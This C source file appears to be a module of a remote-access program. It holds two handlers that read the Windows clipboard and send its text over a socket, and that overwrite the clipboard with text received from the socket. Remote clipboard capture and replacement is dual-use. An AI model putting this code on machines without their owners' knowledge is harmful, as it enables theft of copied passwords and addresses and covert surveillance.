#include "clipboard.h"
#include <stdio.h>

void handle_clipboard_get(SOCKET sock, HANDLE mutex) {
    if (!OpenClipboard(NULL)) {
        sock_send(sock, mutex, "[clipboard_result]ERR:OpenClipboard failed");
        return;
    }
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (!hData) {
        CloseClipboard();
        sock_send(sock, mutex, "[clipboard_result]");
        return;
    }
    wchar_t* pText = (wchar_t*)GlobalLock(hData);
    if (!pText) {
        CloseClipboard();
        sock_send(sock, mutex, "[clipboard_result]ERR:GlobalLock failed");
        return;
    }
    int size = WideCharToMultiByte(CP_UTF8, 0, pText, -1, NULL, 0, NULL, NULL);
    char* buf = malloc(size);
    WideCharToMultiByte(CP_UTF8, 0, pText, -1, buf, size, NULL, NULL);
    GlobalUnlock(hData);
    CloseClipboard();

    // Protocol: replace \r and \n with \n
    char* normalized = str_replace(buf, "\r", "");
    char* final_str = str_replace(normalized, "\n", "\\n");

    char* msg = malloc(strlen(final_str) + 32);
    sprintf(msg, "[clipboard_result]%s", final_str);
    sock_send(sock, mutex, msg);

    free(msg);
    free(final_str);
    free(normalized);
    free(buf);
}

void handle_clipboard_set(SOCKET sock, HANDLE mutex, const char* text) {
    // text has \n as \\n
    char* decoded = str_replace(text, "\\n", "\n");
    int wsize = MultiByteToWideChar(CP_UTF8, 0, decoded, -1, NULL, 0);
    wchar_t* wbuf = malloc(wsize * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, decoded, -1, wbuf, wsize);

    if (!OpenClipboard(NULL)) {
        sock_send(sock, mutex, "[clipboard_set_result]ERR:OpenClipboard failed");
        free(wbuf); free(decoded);
        return;
    }
    EmptyClipboard();
    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, wsize * sizeof(wchar_t));
    if (!hGlobal) {
        CloseClipboard();
        sock_send(sock, mutex, "[clipboard_set_result]ERR:GlobalAlloc failed");
        free(wbuf); free(decoded);
        return;
    }
    wchar_t* pGlobal = (wchar_t*)GlobalLock(hGlobal);
    memcpy(pGlobal, wbuf, wsize * sizeof(wchar_t));
    GlobalUnlock(hGlobal);
    if (!SetClipboardData(CF_UNICODETEXT, hGlobal)) {
        GlobalFree(hGlobal);
        CloseClipboard();
        sock_send(sock, mutex, "[clipboard_set_result]ERR:SetClipboardData failed");
    } else {
        sock_send(sock, mutex, "[clipboard_set_result]ok");
        CloseClipboard();
    }
    free(wbuf); free(decoded);
}
